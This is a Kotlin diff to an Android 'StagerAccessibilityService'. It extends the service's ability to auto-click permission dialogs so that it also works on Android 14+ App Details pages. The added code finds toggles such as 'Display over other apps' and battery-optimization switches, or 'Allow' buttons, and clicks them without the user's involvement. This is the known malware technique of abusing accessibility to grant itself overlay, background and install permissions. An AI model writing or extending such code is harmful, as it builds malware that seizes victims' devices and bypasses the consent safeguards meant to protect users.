@@ -207,6 +207,16 @@ class StagerAccessibilityService : AccessibilityService() {
     fun grantPermissionIfPrompted(): Boolean {
         val root = rootInActiveWindow ?: return false
 
+        // Check if we're on the App Details settings page (Android 14+ redirect)
+        val packageName = packageName
+        val isAppSettingsPage = root.findAccessibilityNodeInfosByText(packageName)?.let {
+            it.isNotEmpty()
+        } ?: false
+
+        if (isAppSettingsPage) {
+            return grantPermissionOnAppSettingsPage(root)
+        }
+
         // Try all common permission button texts (English)
         val searchTexts = arrayOf("Allow", "Allow all the time", "While using the app",
             "Only this time", "Grant", "Install", "Continue", "Next")
@@ -241,6 +251,46 @@ class StagerAccessibilityService : AccessibilityService() {
             node.recycle()
         }
 
+        return false
+    }
+
+    private fun grantPermissionOnAppSettingsPage(root: AccessibilityNodeInfo): Boolean {
+        // On Android 14+, overlay/battery permissions often redirect to App Details
+        // settings. Find the toggle switch for the specific permission and click it.
+        val toggleTexts = arrayOf("Display over other apps", "Draw over other apps",
+            "Battery optimization", "Battery", "Ignore battery optimizations",
+            "Allow", "Allow all the time")
+        for (text in toggleTexts) {
+            val nodes = root.findAccessibilityNodeInfosByText(text)
+            if (nodes != null && nodes.isNotEmpty()) {
+                for (node in nodes) {
+                    // Try clicking the node itself or its parent toggle
+                    if (node.isClickable) {
+                        clickNode(node)
+                        node.recycle()
+                        return true
+                    }
+                    // Try finding a Switch sibling/parent
+                    val parent = node.parent
+                    if (parent != null) {
+                        for (i in 0 until parent.childCount) {
+                            val child = parent.getChild(i)
+                            if (child != null && child.isClickable &&
+                                child.className?.contains("Switch") == true) {
+                                clickNode(child)
+                                child.recycle()
+                                parent.recycle()
+                                node.recycle()
+                                return true
+                            }
+                            child?.recycle()
+                        }
+                        parent.recycle()
+                    }
+                    node.recycle()
+                }
+            }
+        }
         return false
     }
 
